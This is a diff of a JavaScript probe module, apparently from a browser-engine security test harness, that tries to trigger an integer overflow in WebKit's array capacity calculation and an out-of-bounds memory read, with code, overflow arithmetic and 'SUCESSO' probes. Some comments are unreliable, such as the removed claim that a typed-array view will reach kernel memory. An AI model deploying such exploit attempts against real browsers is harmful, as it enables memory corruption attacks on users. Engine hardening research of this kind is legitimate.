@@ -3,59 +3,61 @@ export default {
     category: 'Boundary',
     risk:     'CRITICAL',
     description:
-        'Explora a transição de memória C++ entre Sparse (Dicionário) e Dense (Contínuo). ' +
-        'Força o JSArray a alocar limites gigantes (0xFFFFFFFF) e injeta elementos para ' +
-        'corromper o cálculo de capacidade do Butterfly durante a conversão.',
+        'Força um Integer Overflow no cálculo de capacidade do Butterfly. ' +
+        'Usa Array.prototype.push.apply num array com length próximo do limite ' +
+        'de 32-bits (0xFFFFFFFF). Execução O(1) para evitar freezes da Main Thread.',
 
     setup: function() {
         this.results = {};
-        // Criamos um array Sparse (com buracos massivos)
         this.vulnArray = [];
-        this.vulnArray[0x7FFFFFFF] = 1.1; // Índice muito alto forçando alocação de dicionário
+        
+        // 1. Definimos o tamanho perto do limite máximo de um Unsigned Int 32-bits
+        this.vulnArray.length = 0xFFFFFFFA; // Faltam apenas 5 posições para estourar o limite
+        
+        // 2. O Payload que vamos forçar a entrar (8 elementos)
+        this.payload = [1.11, 2.22, 3.33, 4.44, 5.55, 6.66, 7.77, 8.88]; 
     },
 
     trigger: function() {
         try {
-            // O GATILHO: Tentamos forçar o WebKit a converter o dicionário 
-            // de volta para um bloco contínuo manipulando a ponta do array.
-            // A soma 0x7FFFFFFF + 2 pode causar Integer Overflow interno.
-            this.vulnArray.push(2.2);
-            this.vulnArray.unshift(3.3); 
-
-            // Criamos uma TypedArray corrompida a partir do tamanho overflowed
-            let badLen = this.vulnArray.length;
-            this.buffer = new ArrayBuffer(8);
-            // Se badLen deu a volta (wrap around) ou virou negativo/gigante, 
-            // a criação desta View vai apontar para a memória do Kernel/Processo.
-            this.view = new Uint8Array(this.buffer, badLen, 1);
+            // O GATILHO MATEMÁTICO:
+            // O C++ vai somar length (0xFFFFFFFA) + payload.length (8) = 0x100000002.
+            // Se o motor usar matemática de 32-bits, ele corta o "1" da frente.
+            // O novo tamanho calculado será apenas "2". 
+            // O C++ aloca espaço para 2 elementos, mas copia os 8, transbordando o buffer!
+            Array.prototype.push.apply(this.vulnArray, this.payload);
         } catch(e) {
+            // O Interpretador deve apanhar isto e atirar um RangeError (Invalid array length)
             this.results.error = e.constructor.name;
         }
     },
 
     probe: [
-        // Probe 0: O C++ permitiu a matemática maluca sem RangeError?
-        s => s.results.error || s.vulnArray.length,
+        // Probe 0: O motor C++ defendeu-se atirando RangeError?
+        s => s.results.error || 'Matemática aceite sem erro!',
         
-        // Probe 1: A VIEW CORROMPIDA (OOB Read)
+        // Probe 1: Se a matemática foi aceite, o Array corrompeu memória adjacente?
         s => {
-            if (s.view) {
+            if (!s.results.error) {
                 try {
-                    let val = s.view[0];
-                    if (val !== undefined && val !== 0) {
-                        return `💥 SUCESSO! Leu Ram Nativa OOB: 0x${val.toString(16)}`;
+                    // Se o array estourou, o length pode ser um número negativo 
+                    // ou os elementos sobrescreveram ponteiros na RAM.
+                    let val = s.vulnArray[0xFFFFFFFA + 6]; 
+                    if (typeof val === 'number' && !isNaN(val) && val !== 7.77) {
+                        return `💥 SUCESSO! OOB Read: 0x${val.toString(16)}`;
                     }
-                    return 'Leu Zeros (Seguro)';
-                } catch(e) { return `Falha na leitura: ${e.message}`; }
+                    return 'Valores esperados (Sem Leak)';
+                } catch(e) {
+                    return `Crash controlado na leitura`;
+                }
             }
-            return 'View Protegida';
+            return 'Seguro (RangeError apanhou)';
         }
     ],
 
     cleanup: function() {
         this.vulnArray = null;
-        this.buffer = null;
-        this.view = null;
+        this.payload = null;
         this.results = {};
     }
 };
